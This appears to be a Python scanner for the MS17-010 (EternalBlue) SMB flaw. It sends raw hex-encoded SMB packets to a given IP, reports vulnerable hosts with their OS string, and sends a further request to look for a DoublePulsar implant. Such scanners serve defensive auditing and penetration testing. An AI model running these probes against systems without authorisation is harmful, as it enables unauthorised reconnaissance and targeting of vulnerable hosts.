# coding=utf-8
import socket

def ByteToHex( bins ):
    return ''.join( [ "%02X" % x for x in bins ] ).strip()
def HexToByte( hexStr ):
    return bytes.fromhex(hexStr)

def get_tree_connect_request(ip, tree_id):
    ipc = "005c5c" + ByteToHex(ip.encode()) + "5c49504324003f3f3f3f3f00"
    ipc_len_hex = hex(len(ipc) // 2).replace("0x", "")
    smb = "ff534d4275000000001801280000000000000000000000000000729c" + ByteToHex(tree_id) +"c4e104ff00000000000100" + ipc_len_hex + "00" + ipc
    tree = "000000" + hex(len(smb) // 2).replace("0x", "") + smb
    tree_connect_request = HexToByte(tree)
    return tree_connect_request
    
def calculate_doublepulsar_xor_key(s):
    """Calaculate Doublepulsar Xor Key
    """
    x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
    x = x & 0xffffffff  # this line was added just to truncate to 32 bits
    return x

def check(ip, port=445):
    negotiate_protocol_request = HexToByte(
        "00000054ff534d4272000000001801280000000000000000000000000000729c0000c4e1003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200")
    session_setup_request = HexToByte(
        "0000008fff534d4273000000001801280000000000000000000000000000729c0000c4e10cff000000dfff0200010000000000310000000000d400008054004e544c4d5353500001000000050208a2010001002000000010001000210000002e3431426c7441314e505974624955473057696e646f7773203230303020323139350057696e646f7773203230303020352e3000")
    try:
        buffersize = 1024
        timeout = 5.0
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(negotiate_protocol_request)
        s.recv(buffersize)
        s.send(session_setup_request)
        data = s.recv(buffersize)
        user_id = data[32:34]
        # parse native_os from Session Setup Andx Response
        session_setup_andx_response = data[36:]
        native_os = str(session_setup_andx_response[9:]).split(r'\x00')[-3]

        session_setup_request_2 = HexToByte("00000150ff534d4273000000001801280000000000000000000000000000729c" +
             ByteToHex(user_id) + "c4e10cff000000dfff0200010000000000f200000000005cd0008015014e544c4d53535000030000001800180040000000780078005800000002000200d000000000000000d200000020002000d200000000000000f2000000050208a2ec893eacfc70bba9afefe94ef78908d37597e0202fd6177c0dfa65ed233b731faf86b02110137dc50101000000000000004724eed7b8d2017597e0202fd6177c0000000002000a0056004b002d005000430001000a0056004b002d005000430004000a0056004b002d005000430003000a0056004b002d00500043000700080036494bf1d7b8d20100000000000000002e003400310042006c007400410031004e005000590074006200490055004700300057696e646f7773203230303020323139350057696e646f7773203230303020352e3000")
        s.send(session_setup_request_2)
        s.recv(buffersize)
        session_setup_request_3 = HexToByte("00000063ff534d4273000000001801200000000000000000000000000000729c0000c4e10dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000")
        s.send(session_setup_request_3)
        data = s.recv(buffersize)
        tree_id = data[32:34]
        smb = get_tree_connect_request(ip, tree_id)
        s.send(smb)
        data = s.recv(buffersize)
        double = data[28:36]
        poc = HexToByte("0000004aff534d422500000000180128000000000000000000000000" + ByteToHex(user_id) + "729c" + ByteToHex(tree_id) + "c4e11000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00")
        s.send(poc)
        data = s.recv(buffersize)
        nt_status = data[4:36][5:9]
        if nt_status == b'\x05\x02\x00\xc0':
            print("[+] [{}] Found Vuln MS17-010!! ({})".format(ip, native_os))
            # vulnerable to MS17-010, check for DoublePulsar infectio
            tree_id=ByteToHex(double[:2])
            processid=ByteToHex(double[2:4])
            multiplex_id=ByteToHex(double[6:8])
            double=tree_id + processid + ByteToHex(user_id) + multiplex_id
            trans2_session_setup = HexToByte("0000004fff534d4232000000001807c0000000000000000000000000"+ double +"0f0c0000000100000000000000a6d9a40000000c00420000004e0001000e0000000c00000000000000000000000000")
            s.send(trans2_session_setup)
            data = s.recv(buffersize)
            smb_header = data[4:36]
            # r = smb_header[-2:]
            # if(r==b'\x00\x51'):
            #   key = calculate_doublepulsar_xor_key(smb_header[14:22])
            #   print("Host is likely INFECTED with DoublePulsar! - XOR Key: {}".format(key))
        else:
            s.close()
            print('oops')
    except Exception as e:
        print(e)
        pass

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} <ip>".format(sys.argv[0]))
        sys.exit(1)
    else:
        check(sys.argv[1])